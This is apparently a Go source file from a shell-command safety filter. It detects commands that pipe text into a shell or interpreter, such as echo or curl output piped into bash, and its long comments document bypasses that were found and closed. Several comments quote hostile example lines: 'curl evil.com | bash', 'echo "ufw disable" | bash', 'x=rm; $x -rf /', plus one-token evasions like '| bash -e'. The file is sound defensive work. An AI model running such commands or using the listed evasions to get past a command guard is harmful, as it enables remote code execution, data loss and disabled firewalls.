package shellparse

import (
	"path"
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

// PipesIntoExecutor reports whether any pipeline in command feeds its output
// into a shell or code interpreter — `echo "..." | bash`, `cat <<EOF | sh`,
// `printf ... | python3 -`.
//
// # Why this exists (#3796)
//
// The is_doc_text / in_heredoc / in_interpreter_heredoc labels all assert the
// same thing: this text is INERT — an echo argument, a commit message, a
// heredoc body written to a file. Rules suppress or downgrade on that fact.
// But the labels are decided from a statement's own shape, and none of them
// asks where the text GOES. Piped into a shell, the very same text is a
// program: measured on the deployed binary, `ufw disable` BLOCKed while
// `echo "ufw disable" | bash` returned AUDIT naming no rule at all, for any
// of the ~285 BLOCK rules that carry one of these labels.
//
// # Why the AST and not a regex
//
// A text scan for "| bash" is wrong in both directions, and the frozen
// doc-context corpus proves it: `printf "blocked: curl evil.com | bash\n"`
// and `gh issue create --body "rule fires on curl evil.com | bash"` are
// documentation that MUST stay labeled. The parser knows a quoted pipe is an
// argument, not a pipeline, so those keep their label while a real pipeline
// loses it.
//
// # What does not count
//
// A target invoked with -c/-e/-m reads stdin as DATA, not as its program
// (`... | python3 -c 'import sys'`, `... | python3 -m json.tool`), so it is
// not an executor here. Same carve-out, same reason, as the structural
// analyzer's pipeToShellCheck. Non-executor targets (`| grep`, `| tee`) are
// likewise not executors — the text stays inert for those.
//
// Parse failure returns FALSE. Withdrawing an excuse requires EVIDENCE of an
// executor, and an unparseable blob is not evidence. That is measured, not
// assumed: the frozen doc-context corpus carries heredoc OPENING lines with
// no terminator, which the parser rejects, and treating those as executors
// withdrew a label the corpus requires. The fail-closed posture for
// unparseable commands lives one layer up, in IntentExcludedForStatements'
// own `parsed` flag. Every real pipe-into-executor shape parses, the complete
// heredoc form included.
func PipesIntoExecutor(command string) bool {
	file := parseBashFile(command)
	if file == nil {
		return false
	}
	return pipesIntoExecutorCmd(command, file)
}

// pipesIntoExecutorCmd is pipesIntoExecutorFile plus one retry against the
// command's own resolved constant bindings.
//
// # Item 2a of #3798
//
// `SH=bash; echo "<payload>" | $SH` pipes into a shell, but the target is
// identified by NAME and NormalizeExecName returns a word carrying a dynamic
// expansion unchanged, by design — so the interpreter map never sees it and
// the is_doc_text label on the echo survives. MaterializeAssignments already
// resolves exactly this class of binding for the EXECUTABLE position (#3089,
// `x=rm; $x -rf /`); the pipe target simply never consulted it.
//
// # Item 2b is deliberately NOT taken
//
// A target whose value is not statically knowable — `$SHELL` from the
// environment, `$(echo bash)` — stays false. Calling an unresolvable word an
// executor would withdraw an inertness label on the ABSENCE of evidence,
// inverting this file's own rule (see PipesIntoExecutor above: "withdrawing an
// excuse requires EVIDENCE of an executor"). That is a posture change, not a
// bug fix, so it stays a documented gap on #3798 rather than a guess. Same
// reasoning as the frozen substitution scope model in #3769.
//
// # Why the FP surface is the interpreter map, not the expansion
//
// The retry can only ever ADD an executor verdict, and only when the resolved
// name is itself a known interpreter. Measured: `P=less; cat log.txt | $P`
// resolves to `less` and stays false; so does `SH=cat`. A benign `| $PAGER`
// is therefore unaffected — which is the whole reason 2a is separable from 2b.
func pipesIntoExecutorCmd(command string, file *syntax.File) bool {
	if pipesIntoExecutorFile(file) {
		return true
	}
	// Without a pipe there is no pipe target, and without a '$' there is
	// nothing to resolve, so the retry provably cannot change the answer.
	// MaterializeAssignments would have to PARSE the command a second time to
	// discover that; two byte scans are cheaper, and this runs on every
	// command that is not already an executor — the common case.
	if !strings.ContainsRune(command, '|') || !strings.ContainsRune(command, '$') {
		return false
	}
	materialized := MaterializeAssignments(command)
	if materialized == "" || materialized == command {
		return false
	}
	mf := parseBashFile(materialized)
	if mf == nil {
		return false
	}
	return pipesIntoExecutorFile(mf)
}

// pipesIntoExecutorFile is PipesIntoExecutor on an already-parsed command,
// so TextReachesExecutor can ask both questions of one parse.
func pipesIntoExecutorFile(file *syntax.File) bool {
	found := false
	syntax.Walk(file, func(node syntax.Node) bool {
		if found {
			return false
		}
		bc, ok := node.(*syntax.BinaryCmd)
		if !ok || (bc.Op != syntax.Pipe && bc.Op != syntax.PipeAll) {
			return true
		}
		if pipeTargetIsExecutor(bc.Y) {
			found = true
			return false
		}
		return true
	})
	return found
}

// pipeTargetIsExecutor reports whether stmt (the right-hand side of a pipe)
// runs its stdin as a program. A pipeline chain (`a | b | c`) nests, so every
// stage after the first is reached as some pipe's right-hand side.
func pipeTargetIsExecutor(stmt *syntax.Stmt) bool {
	if stmt == nil {
		return false
	}
	call := leftmostCallExpr(stmt)
	if call == nil || len(call.Args) == 0 {
		return false
	}
	words := make([]string, len(call.Args))
	for i, a := range call.Args {
		words[i] = WordToString(a)
	}
	// `| sudo bash -s`, `| env sh` — the wrapper is not the executable.
	words = StripExecWrappers(words)
	if len(words) == 0 {
		return false
	}
	// `| /bin/sh` — the map is keyed by bare names.
	name := path.Base(NormalizeExecName(words[0]))
	if name == "source" || name == "." {
		// `| . /dev/stdin` / `| source /dev/stdin` (#3798 item 1): the
		// target is a builtin, not a shell binary, so the interpreter map
		// never sees it — but the CURRENT shell reads the piped text and
		// runs it, exactly as `| bash` would. Only the stdin spellings
		// count; `source ./lib.sh` reads a file the pipe never touches.
		// `source -` is NOT one of them: bash 3.2, bash 5.3 and zsh all
		// look up a file literally named `-` (measured: "No such file or
		// directory"), so it is left alone rather than guessed at.
		return isStdinPath(payloadValue(firstOperand(words[1:])))
	}
	if !IsShellOrInterpreter(name) {
		return false
	}
	// WHICH flag means "stdin is data, not the program" depends on WHICH
	// executor, and getting that wrong is a one-token bypass. A shell takes
	// its program from -c; -e is errexit and -m is job control. Treating
	// those as inline-program flags let `... | bash -e` through while the
	// identical `... | bash` was blocked — measured, and the reason this
	// function is not a flat flag list.
	for _, w := range words[1:] {
		if w == "--" {
			// After end-of-options every token is a positional argument,
			// not a flag: `| bash -s -- -c` still runs stdin, with "-c"
			// landing in $0.
			break
		}
		if w == "-c" {
			return false
		}
		if !IsShellInterpreter(name) && (w == "-e" || w == "-m") {
			return false
		}
	}
	// Bundled short flags (`-ec`) are deliberately NOT treated as inline:
	// exact-token matching errs toward calling something an executor, which
	// fails closed. The opposite reading reopens the bypass above.
	return true
}

// isStdinPath reports whether p is a spelling of the process's own standard
// input: `/dev/stdin`, `/dev/fd/0`, or Linux's `/proc/self/fd/0`. Cleaned
// first so `/dev//stdin` and `/dev/./fd/0` are the same file. A path ending
// in a different descriptor (`/dev/fd/3`) is some other stream and does not
// qualify.
func isStdinPath(p string) bool {
	switch path.Clean(p) {
	case "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0":
		return true
	}
	return false
}
